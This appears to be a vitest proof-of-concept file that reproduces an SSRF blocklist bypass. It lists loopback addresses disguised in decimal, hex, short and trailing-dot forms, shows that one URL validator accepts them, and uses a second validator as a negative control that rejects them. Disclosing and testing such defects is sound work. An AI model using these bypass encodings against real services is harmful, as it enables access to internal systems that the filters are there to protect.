import { describe, expect, it } from "vitest";
import dns from "node:dns/promises";
import { validateUserMediaUrl } from "@shared/user-media-url.ts";
import { validateCommunityEndpointUrl } from "@shared/community-endpoint-urls.ts";

// Every one of these strings is a loopback address in disguise.
// The PoC asserts the ACTUAL upstream behaviour: the SSRF filter ACCEPTS them
// (result.ok === true), i.e. the defect is real and reproducible.
const LOOPBACK_ENCODINGS = [
  "http://2130706433/a.png", // decimal 32-bit form of 127.0.0.1
  "http://0x7f000001/a.png", // hex form of 127.0.0.1
  "http://127.1/a.png", // short (a.b) form of 127.0.0.1
  "http://localhost./a.png", // trailing-dot FQDN form
  "http://127.0.0.1./a.png", // trailing-dot IPv4 form
];

async function resolvesToLoopback(hostname: string): Promise<string[]> {
  const records = await dns.lookup(hostname, { all: true });
  return records.map((r) => r.address);
}

describe("SSRF blocklist bypass - shared/user-media-url.ts (VULNERABLE upstream)", () => {
  for (const value of LOOPBACK_ENCODINGS) {
    it(`filter ACCEPTS loopback-in-disguise ${value}`, async () => {
      const result = validateUserMediaUrl(value);
      const host = new URL(value).hostname;
      const addresses = await resolvesToLoopback(host);
      console.log(
        `[user-media-url] ${value} -> allowed=${result.ok} host=${host} resolves=${addresses.join(",")}`,
      );
      // Defect: the validator ALLOWS a host that resolves to loopback.
      expect(result.ok).toBe(true);
      expect(addresses.some((a) => a === "127.0.0.1" || a === "::1")).toBe(true);
    });
  }
});

describe("NEGATIVE CONTROL - shared/community-endpoint-urls.ts blocks the same encodings", () => {
  for (const value of [
    "https://2130706433/v1/chat/completions",
    "https://0x7f000001/v1/chat/completions",
    "https://127.1/v1/chat/completions",
  ]) {
    it(`filter REFUSES loopback-in-disguise ${value}`, async () => {
      const host = new URL(value).hostname;
      const addresses = await resolvesToLoopback(host);
      console.log(
        `[community-endpoint-urls] ${value} -> resolves=${addresses.join(",")}`,
      );
      expect(() => validateCommunityEndpointUrl(value)).toThrow();
    });
  }
});
